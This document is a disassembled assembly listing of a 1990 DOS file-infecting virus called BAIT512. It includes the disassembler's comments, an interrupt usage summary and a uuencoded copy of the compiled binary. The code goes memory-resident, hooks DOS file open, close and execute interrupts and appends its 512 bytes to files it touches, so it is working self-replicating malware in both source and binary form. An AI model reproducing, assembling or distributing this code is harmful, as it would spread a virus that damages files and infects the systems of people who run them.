PAGE  59,132

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                 BAIT512                      ;;
;;;                                      ;;
;;;      Created:   7-Nov-90                             ;;
;;;      Version:                                ;;
;;;      Passes:    9          Analysis Options on: QRS              ;;
;;;                                      ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

data_1e     equ 16h         ; (0000:0016=0)
data_2e     equ 4Ch         ; (0000:004C=34h)
data_3e     equ 4           ; (0004:0004=4Dh)
data_4e     equ 4           ; (77C7:0004=0)
data_5e     equ 0F8h            ; (77C7:00F8=0)

seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a


        org 100h

bait512     proc    far

start:
        mov ah,30h          ; '0'
        int 21h         ; DOS Services  ah=function 30h
                        ;  get DOS version number ax
        mov si,data_3e      ; (0004:0004=4Dh)
        mov ds,si
        cmp ah,1Eh
        lds ax,dword ptr [si+8] ; Load 32 bit ptr
        jc  loc_1           ; Jump if carry Set
        mov ah,13h
        int 2Fh         ; Multiplex/Spooler al=func 34h
        push    ds
        push    dx
        int 2Fh         ; Multiplex/Spooler al=func 34h
        pop ax
        pop ds
loc_1:                      ;  xref 77C7:010F
        mov di,data_5e      ; (77C7:00F8=0)
        stosw               ; Store ax to es:[di]
        mov ax,ds
        stosw               ; Store ax to es:[di]
        mov ds,si
        lds ax,dword ptr [si+40h]   ; Load 32 bit ptr
        stosw               ; Store ax to es:[di]
        cmp ax,121h
        mov ax,ds
        stosw               ; Store ax to es:[di]
        push    es
        push    di
        jnz loc_2           ; Jump if not zero
        shl si,1            ; Shift w/zeros fill
        mov cx,100h
        repe    cmpsw           ; Rep zf=1+cx >0 Cmp [si] to es:[di]
loc_2:                      ;  xref 77C7:0130
        push    cs
        pop ds
        jz  loc_3           ; Jump if zero
        mov ah,52h          ; 'R'
        int 21h         ; DOS Services  ah=function 52h
                        ;  get DOS data table ptr es:bx
        push    es
        mov si,data_5e      ; (77C7:00F8=0)
        sub di,di
        les ax,dword ptr es:[bx+12h]    ; Load 32 bit ptr
        mov dx,es:[di+2]
        mov cx,104h
        rep movsw           ; Rep when cx >0 Mov [si] to es:[di]
        mov ds,cx
        mov di,data_1e      ; (0000:0016=0)
        mov word ptr [di+6Eh],121h
        mov [di+70h],es
        pop ds
        mov [bx+14h],dx
        mov dx,cs
        mov ds,dx
        mov bx,[di-14h]
        dec bh
        mov es,bx
        cmp dx,[di]
        mov ds,[di]
        mov dx,[di]
        dec dx
        mov ds,dx
        mov si,cx
        mov dx,di
        mov cl,8
        rep movsw           ; Rep when cx >0 Mov [si] to es:[di]
        mov ds,bx
        jc  loc_5           ; Jump if carry Set
        int 20h         ; Program Terminate
loc_3:                      ;  xref 77C7:013B
        mov si,cx
        mov ds,[si+2Ch]
loc_4:                      ;  xref 77C7:0190
        lodsw               ; String [si] to ax
        dec si
        test    ax,ax
        jnz loc_4           ; Jump if not zero
        add si,3
        mov dx,si
loc_5:                      ;  xref 77C7:0183
        mov ah,3Dh          ; '='
        call    sub_1           ; (01B0)
        mov dx,[di]
        mov [di+4],dx
        add [di],cx
        pop dx
        push    dx
        push    cs
        pop es
        push    cs
        pop ds
        push    ds
        mov al,50h          ; 'P'
        push    ax
        mov ah,3Fh          ; '?'
        retf                ; Return far

bait512     endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   77C7:0199, 0241
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_1       proc    near
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        jc  loc_ret_6       ; Jump if carry Set
        mov bx,ax

;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;         Called from:   77C7:01D5

sub_2:
        push    bx
        mov ax,1220h
        int 2Fh         ; Multiplex/Spooler al=func 20h
        mov bl,es:[di]
        mov ax,1216h
        int 2Fh         ; Multiplex/Spooler al=func 16h
        pop bx
        push    es
        pop ds
        add di,11h
        mov cx,200h

loc_ret_6:                  ;  xref 77C7:01B2
        retn
sub_1       endp

loc_7:                      ;  xref 77C7:021C
        sti             ; Enable interrupts
        push    es
        push    si
        push    di
        push    bp
        push    ds
        push    cx
        call    sub_2           ; (01B6)
        mov bp,cx
        mov si,[di+4]
        pop cx
        pop ds
        call    sub_3           ; (0211)
        jc  loc_9           ; Jump if carry Set
        cmp si,bp
        jae loc_9           ; Jump if above or =
        push    ax
        mov al,es:[di-4]
        not al
        and al,1Fh
        jnz loc_8           ; Jump if not zero
        add si,es:[di]
        xchg    si,es:[di+4]
        add es:[di],bp
        call    sub_3           ; (0211)
        mov es:[di+4],si

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;           External Entry Point
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

int_24h_entry   proc    far         ;  xref 77C7:026A
        lahf                ; Load ah from flags
        sub es:[di],bp
        sahf                ; Store ah into flags
loc_8:                      ;  xref 77C7:01F1
        pop ax
loc_9:                      ;  xref 77C7:01E2, 01E6
        pop bp
        pop di
        pop si
        pop es
        retf    2           ; Return far
int_24h_entry   endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   77C7:01DF, 01FD, 02A9
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_3       proc    near
        mov ah,3Fh          ; '?'

;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;         Called from:   77C7:02C5

sub_4:
        pushf               ; Push flags
        push    cs
        call    sub_5           ; (023A)
        retn
sub_3       endp

        cmp ah,3Fh          ; '?'
        je  loc_7           ; Jump if equal
        push    ds
        push    es
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        cmp ah,3Eh          ; '>'
        je  loc_11          ; Jump if equal
        cmp ax,4B00h
        mov ah,3Dh          ; '='
        jz  loc_12          ; Jump if zero
loc_10:                     ;  xref 77C7:0244, 02DA
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        pop es
        pop ds

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   77C7:0215
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_5       proc    near
        jmp dword ptr cs:data_4e    ; (77C7:0004=0)
loc_11:                     ;  xref 77C7:0229
        mov ah,45h          ; 'E'
loc_12:                     ;  xref 77C7:0230
        call    sub_1           ; (01B0)
        jc  loc_10          ; Jump if carry Set
        sub ax,ax
        mov [di+4],ax
        mov byte ptr [di-0Fh],2
        cld             ; Clear direction
        mov ds,ax
        mov si,data_2e      ; (0000:004C=34h)
        lodsw               ; String [si] to ax
        push    ax
        lodsw               ; String [si] to ax
        push    ax
        push    word ptr [si+40h]
        push    word ptr [si+42h]
        lds dx,dword ptr cs:[si-50h]    ; Load 32 bit ptr
        mov ax,2513h
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        push    cs
        pop ds
        mov dx,offset int_24h_entry
        mov al,24h          ; '$'
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        push    es
        pop ds
        mov al,[di-4]
        and al,1Fh
        cmp al,1Fh
        je  loc_13          ; Jump if equal
        mov ax,[di+17h]
        sub ax,4F43h
        jnz loc_17          ; Jump if not zero
loc_13:                     ;  xref 77C7:027A
        xor [di-4],al
        mov ax,[di]
        cmp ax,cx
        jb  loc_17          ; Jump if below
        add ax,cx
        jc  loc_17          ; Jump if carry Set
        test    byte ptr [di-0Dh],4
        jnz loc_17          ; Jump if not zero
        lds si,dword ptr [di-0Ah]   ; Load 32 bit ptr
        dec ax
        shr ah,1            ; Shift w/zeros fill
        and ah,[si+4]
        jz  loc_17          ; Jump if zero
        mov ax,20h
        mov ds,ax
        sub dx,dx
        call    sub_3           ; (0211)
        mov si,dx
        push    cx

locloop_14:                 ;  xref 77C7:02B6
        lodsb               ; String [si] to al
        cmp al,cs:[si+7]
        jne loc_18          ; Jump if not equal
        loop    locloop_14      ; Loop if cx > 0

        pop cx
loc_15:                     ;  xref 77C7:02FA
        or  byte ptr es:[di-4],1Fh
loc_16:                     ;  xref 77C7:02E9
        or  byte ptr es:[di-0Bh],40h    ; '@'
loc_17:                     ;  xref 77C7:0282, 028B, 028F, 0295
                        ;            02A0
        mov ah,3Eh          ; '>'
        call    sub_4           ; (0213)
        or  byte ptr es:[di-0Ch],40h    ; '@'
        pop ds
        pop dx
        mov ax,2524h
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        pop ds
        pop dx
        mov al,13h
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx
        jmp loc_10          ; (0232)
loc_18:                     ;  xref 77C7:02B4
        pop cx
        mov si,es:[di]
        mov es:[di+4],si
        mov ah,40h          ; '@'
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        jc  loc_16          ; Jump if carry Set
        mov es:[di],si
        mov es:[di+4],dx
        push    cs
        pop ds
        mov dl,8
        mov ah,40h          ; '@'
        int 21h         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        jmp short loc_15        ; (02B9)
sub_5       endp

        db  0CFh, 36h, 36h, 36h

seg_a       ends



        end start

;;;;;;;;;;;;;;;;;;;; CROSS REFERENCE - KEY ENTRY POINTS ;;;;;;;;;;;;;;;;;;;

    seg:off    type    label
   ---- ----   ----   ---------------
   77C7:0100   far    start
   77C7:0204   far    int_24h_entry

 ;;;;;;;;;;;;;;;;;; Interrupt Usage Synopsis ;;;;;;;;;;;;;;;;;;

        Interrupt 21h :  set intrpt vector al to ds:dx
        Interrupt 21h :  get DOS version number ax
        Interrupt 21h :  open file, al=mode,name@ds:dx
        Interrupt 21h :  write file cx=bytes, to ds:dx
        Interrupt 21h :  get DOS data table ptr es:bx

 ;;;;;;;;;;;;;;;;;; I/O Port Usage Synopsis  ;;;;;;;;;;;;;;;;;;

        No I/O ports used.

begin 775 bait512.com
MM##-(;X$`([>@/P>Q40(<@JT$\TO'E+-+U@?O_@`JXS8JX[>Q41`JSTA`8S8
MJP97=0?1YKD``?.G#A]T2K12S2$&OO@`*_\FQ$<2)HM5`KD$`?.ECMF_%@#'
M16XA`8Q%Q"/.ECMMR$LT@
MB_&.7"RM3H7`=?J#Q@.+UK0]Z!0`BQ6)500!#5I2#@<.'QZP4%"T/\O-(7(9
MB]A3N"`2S2\FBAVX%A+-+UL&'X/'$;D``L/[!E9751Y1Z-[_B^F+=019'^@O
M`'(F._5S(E`FBD7\]M`D'W46)@,U)H=U!"8!+>@1`":)=02?)BDMGEA=7UX'
MR@(`M#^<#N@B`,.`_#]TL!X&4%-14E97@/P^=!0]`$NT/70/7UY:65M8!Q\N
M_RX$`+1%Z&S_<\V-C8`
`
end
